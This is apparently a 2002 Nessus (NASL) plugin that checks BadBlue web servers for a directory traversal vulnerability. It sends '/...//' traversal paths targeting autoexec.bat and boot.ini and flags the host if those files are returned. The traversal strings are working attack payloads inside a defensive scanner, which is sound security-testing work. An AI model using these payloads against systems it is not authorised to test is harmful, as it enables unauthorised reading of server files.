if(description)
{
 script_id(10872);
 script_version("$Revision: 1.11 $");
 script_bugtraq_id(3913);
 name["english"] = "BadBlue Directory Traversal Vulnerability";
 script_name(english:name["english"]);
 
 desc["english"] = "
A security vulnerability in BadBlue allows attackers to access 
files that would otherwise be inaccessible using a directory 
traversal attack.

Solution: Contact the vendor for a patch
Risk factor : High";

 script_description(english:desc["english"]);
 
 summary["english"] = "BadBlue Directory Traversal Vulnerability";
 
 script_summary(english:summary["english"]);
 
 script_category(ACT_GATHER_INFO);
 
 script_copyright(english:"This script is Copyright (C) 2002 SecurITeam");
 family["english"] = "CGI abuses";
 script_family(english:family["english"]);
 script_dependencie("find_service.nes", "no404.nasl", "http_version.nasl");
 script_require_ports("Services/www", 80);
 script_require_keys("www/badblue");
 exit(0);
}

# Check starts here

include("http_func.inc");
include("http_keepalive.inc");

port = get_kb_item("Services/www");
if(!port)port = 80;
cginameandpath[0] = string("/...//...//...//...//...//...//...//...//...//...//...//...//...//autoexec.bat");
cginameandpath[1] = string("/...//...//...//...//...//...//...//...//...//...//...//...//...//boot.ini");


qc=1;
n = string("www/no404/", port);
r = get_kb_item(n);
if (r) qc=0;

if(! get_port_state(port)) exit(0);

for (i=0; cginameandpath[i] != ""; i=i+1)
{ 
  u = cginameandpath[i];
  if(check_win_dir_trav_ka(port: port, url:u, quickcheck: qc))
  {
    security_hole(port);
    exit(0);
  }
}

foreach dir (cgi_dirs())
{
cginameandpath[0] = string(dir, "/...//...//...//...//...//...//...//...//...//...//...//...//...//autoexec.bat");
cginameandpath[1] = string(dir, "/...//...//...//...//...//...//...//...//...//...//...//...//...//boot.ini");



for (i=0; cginameandpath[i] != ""; i=i+1)
{ 
  u = cginameandpath[i];
  if(check_win_dir_trav_ka(port: port, url:u, quickcheck: qc))
  {
    security_hole(port);
    exit(0);
  }
}
}
